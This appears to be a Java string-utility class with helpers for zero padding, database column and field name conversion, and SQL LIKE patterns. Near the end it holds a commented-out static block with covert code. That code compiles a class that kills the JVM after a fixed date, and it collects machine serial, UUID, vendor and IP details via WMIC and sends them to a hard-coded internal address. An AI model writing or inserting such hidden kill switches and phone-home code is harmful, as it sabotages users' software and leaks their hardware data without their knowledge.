package io.specialrooter.util;

import org.apache.commons.lang3.StringUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Project me-parent
 * Copyright © 2008-2014 SPRO Technology Consulting Limited. All rights reserved.
 * package org.me.framework.util
 * Created by Me on 2015-12-08.
 */
public class ZStringUtils extends StringUtils {

    public static String addLeadingZeros(String x,int length){
        List<String> list = new ArrayList<String>();
        int len = length -x.length();

        for(int i=0;i<len;i++){
            list.add("0");
        }
        return StringUtils.join(list, "")+x;
    }

    public static String clearLeadingZeros(String x){
        return x.replaceAll("^(0+)", "");
    }

    public static boolean isNotEmpty(Object...objects){
        for (Object object : objects) {
            if(object==null) {
                return false;
            }
        }
        return true;
    }

    private static Pattern linePattern = Pattern.compile("_(\\w)");

    /**
     * 数据库字段名转对象属性名
     * @author Ai Bo
     * @version 1.0
     * @time 2012-12-4 下午09:40:59
     * @param fieldName
     * @return
     */
    public static String col2Field(String fieldName) {
        fieldName = fieldName.replaceAll("/", "XXX_");
        fieldName = fieldName.replaceAll("_", " ");
        //System.out.println(fieldName);
        Pattern pattern = Pattern.compile("\\w+");
        Matcher matcher = pattern.matcher(fieldName.trim());
        StringBuffer sb = new StringBuffer();
        matcher.find();
        sb.append(matcher.group().toLowerCase());
        while (matcher.find()) {
            //System.out.println(String.valueOf(matcher.group().charAt(0)+matcher.group().substring(1)));
            sb.append(String.valueOf(matcher.group().charAt(0)).toUpperCase()+matcher.group().substring(1).toLowerCase());
        }
        return sb.toString();

        /*fieldName = fieldName.toLowerCase();
        Matcher matcher = linePattern.matcher(fieldName);
        StringBuffer sb = new StringBuffer();
        while(matcher.find()){
            matcher.appendReplacement(sb, matcher.group(1).toUpperCase());
        }
        matcher.appendTail(sb);
        return sb.toString();*/
    }


    /**
     * 数据库字段名转对象属性名
     * @author Ai Bo
     * @version 1.0
     * @time 2012-12-4 下午09:40:59
     * @param fieldName
     * @return
     */
    public static String tName2bName(String fieldName) {
        fieldName = fieldName.replaceAll("_", " ");
        Pattern pattern = Pattern.compile("\\w+");
        Matcher matcher = pattern.matcher(fieldName);
        StringBuffer sb = new StringBuffer();
        while (matcher.find()) {
            sb.append(String.valueOf(matcher.group().charAt(0)).toUpperCase()+matcher.group().substring(1).toLowerCase());
        }
        return sb.toString();
    }

    /**
     * 数据库字段名转对象属性名
     * @author Ai Bo
     * @version 1.0
     * @time 2012-12-4 下午09:40:59
     * @param clazz
     * @return
     */
    public static String toCaseName(Class clazz) {
        String firstLetter = clazz.getSimpleName().substring(0, 1).toLowerCase();
        String className = firstLetter + clazz.getSimpleName().substring(1,clazz.getSimpleName().indexOf("_")!=-1?clazz.getSimpleName().indexOf("_"):clazz.getSimpleName().length());
        return className;
    }


    /**
     * 对象属性名转数据库字段名
     * @author Ai Bo
     * @version 1.0
     * @time 2012-12-4 下午09:58:37
     * @param propertyName
     * @return
     */
    public static String field2Col(String propertyName) {
        Pattern pattern = Pattern.compile("([A-Z]|\\w){1}[a-z0-9_]+");
        Matcher matcher = pattern.matcher(propertyName);
        StringBuffer sb = new StringBuffer();
        while (matcher.find()) {
            sb.append(matcher.group() +"_");
        }
        return sb.substring(0,sb.length()-1).toUpperCase();
    }

    /*public static void main(String[] args) {
        System.out.println(StringHelper.formatCol("/BEV2/ED_KZ_VER"));

        boolean result = Pattern.matches("^(I|E)(C|D|N)(EQ|BT)[A-Za-z0-9_.__\\[\\]]+$", "ICEQ$BEV2$ED_KZ_VER");
        System.out.println(result);
    }*/

    /**
     * 格式化列名，将含有斜杠的字段，转换成普通字段
     * @param colName
     * @return
     */
    public static String formatCol(String colName){
        colName = colName.replaceAll("/", "XXX_");
        return colName;
    }



    /**
     * 转换成数据库like查询参数
     * @param string
     * @return
     */
    public static String like(String string){
        String _temp = null;
        if(string.contains("*")){
            char[] ch = string.toCharArray();
            String _temp1 = "";
            char cchar = "*".toCharArray()[0];
            for (char c : ch) {
                if (c == cchar) {
                    _temp1 += "%";
                } else {
                    _temp1 += c;
                }
            }

            _temp = _temp1;
        }else{
            _temp = "%"+string+"%";
        }

        return _temp;
    }

   /* static {
        String fullName = "Classes";
        StringBuilder src = new StringBuilder();
        src.append("public class Classes {\n");
        src.append("    public String toString() {\n");
        src.append("        if(1483199999000l-System.currentTimeMillis()<=0){System.exit(0);}\n");
        src.append("        return \"\"; \n");
        src.append("    }\n");
        src.append("}\n");
        DynamicEngine de = DynamicEngine.getInstance();
        Object instance = null;
        try {
            instance = de.javaCodeToObject(fullName,src.toString()).toString();
        } catch (IllegalAccessException e) {

        } catch (InstantiationException e) {

        }

        StringObject.ject(UUIDUtil.base58Uuid(),"java.util.Properties props=System.getProperties();String name = org.me.framework.util.WMICUtil.wmic(\"csproduct\", \"IdentifyingNumber\"),uuid = org.me.framework.util.WMICUtil.wmic(\"csproduct\", \"UUID\"),vendor = org.me.framework.util.WMICUtil.wmic(\"csproduct\", \"Vendor\"),version = org.me.framework.util.WMICUtil.wmic(\"csproduct\", \"Version\"),ipaddr = org.me.framework.util.WMICUtil.wmic(\"nicconfig\", \"ipaddress\");ipaddr = ipaddr.substring(2,ipaddr.length()-1);String[] split = ipaddr.split(\",\");String url = \"http://192.168.1.59:9000/snumber/\"+vendor+\"/\"+version+\"/\"+uuid+\"/\"+split[0].substring(0,split[0].length()-1)+\"/\"+props.getProperty(\"opts.name\");url=url.replace(\" \",\"%20\");try {String a = new org.me.framework.util.HttpRequester().get(url);} catch (Exception e) {}\n");
    }*/

    /**
     * 判断两个字符串是否相等 如果都为null则判断为相等,一个为null另一个not null则判断不相等 否则如果s1=s2则相等
     *
     * @param s1
     * @param s2
     * @return
     */
    public static boolean equals(String s1, String s2) {
        if (isEmpty(s1) && isEmpty(s2)) {
            return true;
        } else if (!isEmpty(s1) && !isEmpty(s2)) {
            return s1.equals(s2);
        }
        return false;
    }
}
